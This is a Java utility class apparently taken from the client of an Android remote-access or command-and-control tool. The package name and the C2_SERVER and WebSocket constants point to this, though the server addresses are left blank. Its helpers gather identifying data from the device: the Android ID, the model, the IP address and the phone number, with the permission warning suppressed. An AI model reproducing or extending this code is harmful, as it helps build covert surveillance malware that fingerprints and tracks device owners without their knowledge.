package com.ot.grhq.client.functionality;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;

/**
 * Extra functionalities
 */
public class Utils {

    private static final String C2_SERVER = "";

    public static final String WEB_SOCKET_SERVER = "ws://";

    private static SharedPreferences preferences;

    public static String getC2Address() {
        return C2_SERVER.endsWith("/") ? C2_SERVER.substring(0, C2_SERVER.length() - 1) : C2_SERVER;
    }

    /**
     * Get device's client id
     * @param context
     * @return client id
     */
    public static int clientID(Context context) {
        preferences = context.getSharedPreferences("data", Context.MODE_PRIVATE);
        return preferences.getInt("client_id", -1);
    }

    /**
     * Get device API
     * @return device API
     */
    public static int deviceAPI() {
        return Build.VERSION.SDK_INT;
    }

    /**
     * Get device identifier
     * @param context
     * @return device identifier
     */
    public static String deviceID(Context context) {
        // Get the device ID
        String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);

        if (deviceId != null && !deviceId.isEmpty())
            return deviceId;

        return null;
    }

    /**
     * Get device manufacturer and model
     * @return device model
     */
    public static String deviceModel() {
        return Build.MANUFACTURER + " " + Build.MODEL;
    }

    /**
     * Get device's IP address
     * @return ip address
     */
    public static String ipAddress() {
        try {
            // Iterate through all network interfaces
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface networkInterface = interfaces.nextElement();
                // Iterate through all IP addresses of the current network interface
                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress address = addresses.nextElement();
                    // Check if the IP address is not a loopback or link-local address
                    if (!address.isLoopbackAddress() && !address.isLinkLocalAddress()) {
                        return address.getHostAddress();
                    }
                }
            }
        } catch (SocketException e) {
            e.printStackTrace();
        }
        return null; // Return null if no suitable IP address is found
    }

    @SuppressLint("MissingPermission")
    public static String phoneNumber(Context context) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String phoneNumber = "";

        // Get the phone number
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M)
            phoneNumber = telephonyManager.getLine1Number();

        return phoneNumber;
    }
}
